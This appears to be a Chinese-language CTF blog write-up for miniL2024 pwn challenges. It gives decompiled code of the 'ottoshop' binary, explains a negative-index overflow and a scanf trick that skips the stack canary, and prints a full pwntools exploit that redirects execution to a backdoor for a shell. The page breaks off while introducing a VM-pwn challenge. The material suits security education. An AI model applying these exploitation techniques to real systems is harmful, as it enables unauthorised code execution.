<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>miniL2024_pwn | nyyyddddn</title>
  <meta name="author" content="nyyyddddn">
  
  <meta name="description" content="pwnottoshopida显示有些奇怪，修了一下，程序的逻辑是这样的，程序里还有一个backdoor，通过buy中的下界溢出去写binsh字符串，然后golden中的 scanf去写返回地址为backdoor就好了，scanf 如果输入数据的类型和formatstrings不匹配就不会写入数据，通过这种方式去绕过canary
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
&amp;#123;
  unsigned int v3; // eax
  int v4; // [rsp+Ch] [rbp-44h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  v3 = time(0LL);
  srand(v3);
  puts(&#34;Welcome to miniL pwn checkin!&#34;);
  puts(&#34;Here,a ♿ shop,have some magic ♿ for u ~&#34;);
  puts(&#34;u have 50 ottobucks to buy No.1-No.255 ♿!&#34;);
  while ( 1 )
  &amp;#123;
    do
    &amp;#123;
      while ( 1 )
      &amp;#123;
        menu();
        scanf();
        if ( v4 != 666 )
          break;
        puts(&#34;u find it!&#34;);
        ottoottootto();
      &amp;#125;
    &amp;#125;
    while ( v4 &gt; 666 );
    if ( v4 == 4 )
    &amp;#123;
      check();
    &amp;#125;
    else if ( v4 &amp;lt;= 4 )
    &amp;#123;
      switch ( v4 )
      &amp;#123;
        case 3:
          Golden();
          break;
        case 1:
          buy();
          break;
        case 2:
          change();
          break;
      &amp;#125;
    &amp;#125;
  &amp;#125;
&amp;#125;

unsigned __int64 buy()
&amp;#123;
  int a; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  a = 0;
  if ( money &gt; 0 )
  &amp;#123;
    puts(&#34;which ♿ ?&#34;);
    scanf(&#34;%d&#34;, (int)&amp;amp;a);
    wheelchair[a] = 666;
    if ( a &gt; 255 )
    &amp;#123;
      puts(&#34;? fxxk u!&#34;);
      exit(1);
    &amp;#125;
    puts(&#34;Give your ♿ a name!&#34;);
    read(0, (char *)&amp;amp;name + 4 * a, 4uLL);
    --money;
  &amp;#125;
  else
  &amp;#123;
    puts(&#34;NONONO..&#34;);
  &amp;#125;
  return v2 - __readfsqword(0x28u);
&amp;#125;

unsigned __int64 Golden()
&amp;#123;
  int a; // [rsp+8h] [rbp-18h] BYREF
  int i; // [rsp+Ch] [rbp-14h]
  char v3[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  a = 0;
  if ( gold != 1 )
  &amp;#123;
    puts(&#34;NONONONO..&#34;);
    exit(1);
  &amp;#125;
  puts(&#34;Here are only 5 golden ♿..&#34;);
  puts(&#34;How many golden ♿ u want to buy?&#34;);
  scanf(&#34;%d&#34;, (int)&amp;amp;a);
  if ( a &gt; 5 )
  &amp;#123;
    puts(&#34;U R Greedy!&#34;);
    exit(1);
  &amp;#125;
  for ( i = 0; i &amp;lt; a; ++i )
  &amp;#123;
    if ( money &amp;lt;= 14 )
    &amp;#123;
      puts(&#34;nononono..&#34;);
      return v4 - __readfsqword(0x28u);
    &amp;#125;
    puts(aUCanGiveYourGo);
    scanf(&#34;%ld&#34;, (int)&amp;amp;v3[8 * i]);
    money -= 15;
  &amp;#125;
  return v4 - __readfsqword(0x28u);
&amp;#125;

exp
from pwn import *
# from LibcSearcher import *
import itertools
import ctypes

context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)

is_debug = 1
IP = &#34;127.0.0.1&#34;
PORT = 9999

elf = context.binary = ELF(&#39;./ottoshop&#39;)
libc = elf.libc

def connect():
    return remote(IP, PORT) if not is_debug else process()

g = lambda x: gdb.attach(x)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
r = lambda x=None: p.recv() if x is None else p.recv(x)
rl = lambda: p.recvline()
ru = lambda x: p.recvuntil(x)
r_leak_libc_64 = lambda: u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))
r_leak_libc_32 = lambda: u32(p.recvuntil(b&#39;\xf7&#39;)[-4:])


def buy(idx,content):
    sla(&#39;5.exit\n&#39;,b&#39;1&#39;)
    sl(str(idx))
    sa(&#34;name!&#34;,content)

p = connect()


backdoor = 0x402128

# set menory = 0x10000
buy(-90,p32(0x10000))

# set flag1 = /bin/sh
buy(-92,p32(0x6e69622f))
buy(-91,p32(0x0068732f))

# set gold = 1
sla(b&#39;5.exit\n&#39;,&#34;666&#34;)
sa(b&#39;find it!\n&#39;,b&#39;\n&#39;)


sla(b&#39;5.exit\n&#39;,&#34;3&#34;)

sla(b&#39;want to buy?\n&#39;,&#34;4&#34;)
for i in range(3):
    sla(b&#39;passwd!&#39;,b&#39;-&#39;)

sla(b&#39;passwd!&#39;,str(backdoor).encode())




p.interactive()

game啊这，这个game太抽象了一点都不好玩，不复现了
Easyvm2024第一次做vmpwn相关的题目，去了解了一下vmpwn相对ctf re方向的虚拟机逆向来说，除了要识别 虚拟机中的 寄存器 堆栈，有哪些Instruct handler外，还需要去分析Instruct handler有什么漏洞，构造一些输入去触发这些漏洞，程序的逻辑大概是这样的"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="miniL2024_pwn"/>
  <meta property="og:site_name" content="nyyyddddn"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="nyyyddddn" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">nyyyddddn</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/catergories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> miniL2024_pwn</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="ottoshop"><a href="#ottoshop" class="headerlink" title="ottoshop"></a>ottoshop</h2><p>ida显示有些奇怪，修了一下，程序的逻辑是这样的，程序里还有一个backdoor，通过buy中的下界溢出去写binsh字符串，然后golden中的 scanf去写返回地址为backdoor就好了，scanf 如果输入数据的类型和formatstrings不匹配就不会写入数据，通过这种方式去绕过canary</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-44h]</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">srand</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to miniL pwn checkin!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Here,a ♿ shop,have some magic ♿ for u ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"u have 50 ottobucks to buy No.1-No.255 ♿!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">do</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">!=</span> <span class="token number">666</span> <span class="token punctuation">)</span>
          <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"u find it!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">ottoottootto</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span> v4 <span class="token operator">></span> <span class="token number">666</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">&lt;=</span> <span class="token number">4</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">switch</span> <span class="token punctuation">(</span> v4 <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>
          <span class="token function">Golden</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
          <span class="token function">buy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
          <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">unsigned</span> __int64 <span class="token function">buy</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> a<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>

  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> money <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"which ♿ ?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    wheelchair<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">666</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> a <span class="token operator">></span> <span class="token number">255</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"? fxxk u!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Give your ♿ a name!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>name <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> a<span class="token punctuation">,</span> <span class="token number">4uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">--</span>money<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"NONONO.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> v2 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">unsigned</span> __int64 <span class="token function">Golden</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> a<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-18h] BYREF</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-14h]</span>
  <span class="token keyword">char</span> v3<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h]</span>

  v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> gold <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"NONONONO.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Here are only 5 golden ♿.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"How many golden ♿ u want to buy?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> a <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"U R Greedy!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> a<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> money <span class="token operator">&lt;=</span> <span class="token number">14</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"nononono.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> v4 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span>aUCanGiveYourGo<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%ld"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">[</span><span class="token number">8</span> <span class="token operator">*</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    money <span class="token operator">-=</span> <span class="token number">15</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> v4 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># from LibcSearcher import *</span>
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> ctypes

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">1</span>
IP <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>
PORT <span class="token operator">=</span> <span class="token number">9999</span>

elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ottoshop'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">buy</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'5.exit\n'</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">"name!"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>

p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>


backdoor <span class="token operator">=</span> <span class="token number">0x402128</span>

<span class="token comment"># set menory = 0x10000</span>
buy<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">90</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">0x10000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># set flag1 = /bin/sh</span>
buy<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">92</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">0x6e69622f</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
buy<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">91</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">0x0068732f</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># set gold = 1</span>
sla<span class="token punctuation">(</span><span class="token string">b'5.exit\n'</span><span class="token punctuation">,</span><span class="token string">"666"</span><span class="token punctuation">)</span>
sa<span class="token punctuation">(</span><span class="token string">b'find it!\n'</span><span class="token punctuation">,</span><span class="token string">b'\n'</span><span class="token punctuation">)</span>


sla<span class="token punctuation">(</span><span class="token string">b'5.exit\n'</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">b'want to buy?\n'</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'passwd!'</span><span class="token punctuation">,</span><span class="token string">b'-'</span><span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">b'passwd!'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>




p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>啊这，这个game太抽象了一点都不好玩，不复现了</p>
<h2 id="Easyvm2024"><a href="#Easyvm2024" class="headerlink" title="Easyvm2024"></a>Easyvm2024</h2><p>第一次做vmpwn相关的题目，去了解了一下vmpwn相对ctf re方向的虚拟机逆向来说，除了要识别 虚拟机中的 寄存器 堆栈，有哪些Instruct handler外，还需要去分析Instruct handler有什么漏洞，构造一些输入去触发这些漏洞，程序的逻辑大概是这样的</p>
<p>先mmap出来两个内存段，然后read opcode to memory，之后init_sandbox，start_vm这个函数开始处理opcode。</p>
